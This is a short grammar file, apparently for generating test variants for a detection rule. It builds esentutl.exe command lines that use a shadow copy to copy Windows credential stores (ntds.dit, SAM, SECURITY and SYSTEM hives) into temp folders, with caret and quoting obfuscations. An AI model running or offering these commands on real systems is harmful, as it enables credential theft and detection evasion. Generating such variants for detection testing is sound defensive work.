win_esentutl_sensitive_file_copy_grammar = {
    "<start>": [
        "<esentutl_attack>"
    ],
    "<esentutl_attack>": [
        "<executable> <params_reordered>"
    ],
    "<executable>": [
        "esentutl.exe",
        "ESENTUTL",
        "%windir%\\system32\\esentutl.exe",
        "C:\\Windows\\SysNative\\esentutl.exe"
    ],
    "<params_reordered>": [
        "<vss> <y_and_source> <mode>",
        "<mode> <vss> <y_and_source>",
        "<y_and_source> <mode> <vss>"
    ],
    "<vss>": [
        "/vss",
        "'/vss'",
        "/v^ss"
    ],
    "<y_and_source>": [
        "/y <sensitive_path>"
    ],
    "<mode>": [
        "/m <destination_file>"
    ],
    "<sensitive_path>": [
        "C:\\windows\\ntds\\ntds.dit",
        "\\\\127.0.0.1\\C$\\Windows\\System32\\config\\sam",
        "\"%SystemRoot%\\System32\\config\\RegBack\\security\"",
        "C:/Windows/repair/system"
    ],
    "<destination_file>": [
        "C:\\Temp\\ntds_backup.dit",
        "\"%TEMP%\\sam.bak\"",
        "C:\\Perflogs\\sys.hive"
    ]
}